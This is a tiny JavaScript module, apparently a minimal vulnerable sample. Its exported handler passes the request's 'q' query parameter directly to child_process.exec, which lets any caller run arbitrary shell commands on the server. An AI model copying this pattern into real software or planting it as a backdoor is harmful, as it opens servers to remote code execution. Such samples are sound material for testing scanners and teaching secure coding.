import cp from 'child_process';
export function h(req) {
  cp.exec(req.query.q);
}
